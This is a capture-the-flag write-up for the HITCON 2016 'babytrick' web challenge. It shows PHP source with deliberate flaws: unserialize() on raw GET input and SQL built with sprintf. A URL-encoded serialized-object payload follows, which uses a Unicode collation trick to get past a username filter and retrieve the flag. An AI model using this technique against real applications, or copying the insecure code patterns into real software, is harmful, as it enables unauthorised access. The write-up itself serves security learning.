# Challenge 
```php 
<?php

include "config.php";

class HITCON{

  private $method;

  private $args;

  private $conn;

  public function __construct($method, $args) {

    $this->method = $method;

    $this->args = $args;

    $this->__conn();

  }

  function show() {

    list($username) = func_get_args();

    $sql = sprintf("SELECT * FROM users WHERE username='%s'", $username);

    $obj = $this->__query($sql);

    if ( $obj != false ) {

      $this->__die( sprintf("%s is %s", $obj->username, $obj->role) );

    } else {

      $this->__die("Nobody Nobody But You!");

    }  

  }

  function login() {

    global $FLAG;

    list($username, $password) = func_get_args();

    $username = strtolower(trim(mysql_escape_string($username)));

    $password = strtolower(trim(mysql_escape_string($password)));

    $sql = sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'", $username, $password);

    if ( $username == 'orange' || stripos($sql, 'orange') != false ) {

      $this->__die("Orange is so shy. He do not want to see you.");

    }

    $obj = $this->__query($sql);

    if ( $obj != false && $obj->role == 'admin' ) {

      $this->__die("Hi, Orange! Here is your flag: " . $FLAG);

    } else {

      $this->__die("Admin only!");

    }

  }

  function source() {

    highlight_file(__FILE__);

  }

  function __conn() {

    global $db_host, $db_name, $db_user, $db_pass, $DEBUG;

    if (!$this->conn)

      $this->conn = mysql_connect($db_host, $db_user, $db_pass);

    mysql_select_db($db_name, $this->conn);

    if ($DEBUG) {

      $sql = "CREATE TABLE IF NOT EXISTS users (

            username VARCHAR(64),

            password VARCHAR(64),

            role VARCHAR(64)

          ) CHARACTER SET utf8";

      $this->__query($sql, $back=false);

      $sql = "INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')";

      $this->__query($sql, $back=false);

    }

    mysql_query("SET names utf8");

    mysql_query("SET sql_mode = 'strict_all_tables'");

  }

  function __query($sql, $back=true) {

    $result = @mysql_query($sql);

    if ($back) {

      return @mysql_fetch_object($result);

    }

  }

  function __die($msg) {

    $this->__close();

    header("Content-Type: application/json");

    die( json_encode( array("msg"=> $msg) ) );

  }

  function __close() {

    mysql_close($this->conn);

  }

  function __destruct() {

    $this->__conn();

    if (in_array($this->method, array("show", "login", "source"))) {

      @call_user_func_array(array($this, $this->method), $this->args);

    } else {

      $this->__die("What do you do?");

    }

    $this->__close();

  }

  function __wakeup() {

    foreach($this->args as $k => $v) {

      $this->args[$k] = strtolower(trim(mysql_escape_string($v)));

    }

  }

}

if(isset($_GET["data"])) {

  @unserialize($_GET["data"]);  

} else {

  new HITCON("source", array());

}
```

# Solution

payload

```
O%3A6%3A%22HITCON%22%3A3%3A%7Bs%3A14%3A%22%00HITCON%00method%22%3Bs%3A5%3A%22login%22%3Bs%3A12%3A%22%00HITCON%00args%22%3Ba%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22OR%C3%84NGE%22%3Bs%3A8%3A%22password%22%3Bs%3A13%3A%22babytrick1234%22%3B%7Ds%3A12%3A%22%00HITCON%00conn%22%3BN%3B%7D
```



# Refference
+ [hitcon-ctf-2016???babytrick](https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2016/babytrick)

https://blog.spoock.com/2016/11/08/hitcon-babytrick-writeup/
